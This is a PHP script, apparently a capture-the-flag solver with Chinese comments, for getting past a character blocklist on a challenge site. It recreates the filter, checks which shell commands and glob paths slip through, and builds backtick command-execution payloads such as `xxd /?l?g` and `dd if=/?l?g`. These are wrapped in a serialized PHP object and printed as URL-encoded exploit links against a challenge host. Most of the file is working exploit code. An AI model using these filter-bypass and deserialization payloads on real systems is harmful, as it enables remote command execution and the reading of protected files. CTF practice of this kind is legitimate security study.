<?php
// blocked_b: find, filter, c, pa, proc, dir, regexp, n, alter, load, grep, o, file, t, w, insert, sort, h, sy, .., array, sh, touch, e, php, f

// 需要绕过的字符: c, n, t, w, h, e, f, o
// 可用的: a, b, d, g, i, j, k, l, m, p, q, r, s, u, v, x, y, z

// 构造 /flag 但是不能用 'f'
// 用变量拼接？$x='/';$x.='flag'; 但还是有'f'

// 用数组索引？$_SERVER, $GLOBALS 都有被过滤的字符

// 用反斜杠转义？ \146 (f的八进制) - 但是需要在字符串中

// 用位运算？ 'flag'[0] == 'f' == chr(102)
// 但是 chr 有 'c', 'h'

// 试试用字符串异或、位运算构造字符
// 'f' = chr(102) = 0x66
// 可以用: ('F' ^ '`') 不行，还是需要构造

// 或者！直接读取所有文件然后找flag
// scandir('/') - 有 'c', 'n', 'dir'
// glob('/*') - 有 'o'

// 用 opendir? 有 'o', 'e', 'n', 'dir'

// 让我想想 Linux 命令
// 不用字母的命令？用数字和符号？

// 尝试用 `` 执行命令，但是命令本身要绕过
// 常见命令: cat(c), head(h,e), tail(t), less(e), more(o,e), vi(无法输出), dd

// dd 命令只有'd'，可用！
// `dd if=/flag` - 但是有 'if' 和 'f'

// 换个思路：用 $(()) 算术运算？不行，需要命令

// 用 PHP 的文件操作
// file_get_contents - 有 file, e, n, t, c, o, n, t, e, n, t
// readfile - 有 e, file
// fopen - 有 f, o, e, n  
// fread - 有 f, e
// fgets - 有 f, e, t
// fgetc - 有 f, e, t, c
// file - 有 file, e
// include - 有 c, e, n
// require - 有 e, require(无)... 等等，require_once 有 'e','o','n','c','e'

// highlight_file - 有 h, file, e
// show_source - 有 h, o, w, o, c, e

// 用 curl? `curl file:///flag` - 有很多被过滤字符

// 等等！我们可以用 passthru, 但是...
// passthru - blocked_a 有 'p','s','h'

// 或者用 popen - 有 'o', 'e', 'n'

// 用 proc_open - 有 'proc', 'o', 'e', 'n'

// 想想别的... 用base64编码绕过？
// 但是base64_encode/decode 都有 'e'

// 用正则？preg_match 有 'e', 'c', 'h'

// 用反射？ReflectionClass 有很多被过滤字符

echo "让我们系统地找出能读取文件的方法:\n\n";

// 方案1: 使用没有被过滤字符的 shell 命令
echo "=== 方案1: 找Linux命令 ===\n";
$commands = ['dd', 'vi', 'ls', 'awk', 'sed', 'grep', 'cut', 'tr', 'rev', 'bzcat', 'zcat', 'xz', 'gzip', 'bzip2', 'tar'];
$blocked_b = ['find', 'filter', 'c', 'pa', 'proc', 'dir', 'regexp', 'n', 'alter', 'load', 'grep', 'o', 'file', 't', 'w', 'insert', 'sort', 'h', 'sy', '\.\.', 'array', 'sh', 'touch', 'e', 'php', 'f'];
$pattern_b = '/' . implode('|', array_map(function ($s) {
    return preg_quote($s, '/'); }, $blocked_b)) . '/i';

foreach ($commands as $cmd) {
    $test = "`$cmd`";
    if (!preg_match($pattern_b, $test)) {
        echo "可用命令: $cmd\n";
    }
}

// 方案2: 用可变变量
echo "\n=== 方案2: 可变变量 ===\n";
// $$x 这种形式，但是变量名本身也会被检查

// 方案3: 用数组
echo "\n=== 方案3: 数组操作 ===\n";
$test = '[1,2,3]';
if (!preg_match($pattern_b, $test)) {
    echo "数组字面量可用: []\n";
}

// 方案4: 字符串操作
echo "\n=== 方案4: 字符串操作 ===\n";
$string_ops = ['substr', 'strlen', 'str_replace', 'strpos', 'strtoupper', 'strtolower', 'trim', 'ltrim', 'rtrim', 'ucfirst', 'lcfirst', 'substr_replace', 'str_pad', 'str_repeat', 'str_split', 'chunk_split', 'wordwrap', 'strrev', 'str_shuffle'];

foreach ($string_ops as $func) {
    if (function_exists($func) && !preg_match($pattern_b, $func)) {
        echo "可用函数: $func\n";
    }
}

// 方案5: 特殊变量
echo "\n=== 方案5: 特殊变量 ===\n";
$vars = ['$argv', '$argc', '$$', '$php_errormsg', '$http_response_header'];
foreach ($vars as $var) {
    if (!preg_match($pattern_b, $var)) {
        echo "可用变量: $var\n";
    }
}

// 方案6: 通配符
echo "\n=== 方案6: 通配符路径 ===\n";
$paths = ['/?l?g', '/????', '/*', '/[abcdef]lag', '/{f}lag'];
foreach ($paths as $path) {
    if (!preg_match($pattern_b, $path)) {
        echo "可用路径模式: $path\n";
    } else {
        echo "被过滤: $path\n";
    }
}

// 关键发现！
echo "\n=== 关键发现 ===\n";
echo "问题: 几乎所有文件读取函数都包含被过滤的字符\n";
echo "但是... 我们可以用 ` ` 反引号执行命令!\n";
echo "只要命令本身不包含被过滤字符\n\n";

// 寻找可用的读取命令
echo "可能的命令:\n";
echo "1. dd - 只有'd'，可用！\n";
echo "2. rev - 有'e'，不可用\n";
echo "3. strings - 有's'(blocked_a), 't','n'\n";
echo "4. xxd - 有'd'... 等等，只有'x'和'd'！\n";

$test_xxd = '`xxd /?l?g`';
if (!preg_match($pattern_b, $test_xxd)) {
    echo "\nxxd 可用!: $test_xxd\n";
} else {
    preg_match_all($pattern_b, $test_xxd, $m);
    echo "\nxxd 被过滤: " . implode(',', $m[0]) . "\n";
}

// 但是路径 /?l?g 有没有问题？
$test_path = '/?l?g';
if (!preg_match($pattern_b, $test_path)) {
    echo "路径 /?l?g 可用!\n";
} else {
    preg_match_all($pattern_b, $test_path, $m);
    echo "路径 /?l?g 被过滤: " . implode(',', $m[0]) . "\n";
}

// 完整测试
echo "\n=== 完整payload测试 ===\n";
$payloads = [
    'var_dump(`xxd /?l?g`);',
    'var_dump(`dd if=/?l?g 2>&1`);',
    'var_dump(`/???/xxd /?l?g`);',
    'var_dump(`/???/dd if=/?l?g`);',
    'var_dump(`*d /?l?g`);', // 匹配 xxd, dd 等
];

foreach ($payloads as $i => $payload) {
    echo "\nPayload $i: $payload\n";
    if (!preg_match($pattern_b, $payload)) {
        echo "  ✓ 可以使用！\n";

        // 生成完整exploit
        class FLAG
        {
            public $a;
            public $b;
        }
        $obj = new FLAG();
        $obj->a = "FLAG";
        $obj->b = $payload;
        $serial = serialize($obj);
        $encoded = urlencode($serial);
        echo "  URL: http://challenge.bluesharkinfo.com:29023/?exp=$encoded\n";
    } else {
        preg_match_all($pattern_b, $payload, $m);
        echo "  ✗ 被过滤: " . implode(',', array_unique($m[0])) . "\n";
    }
}
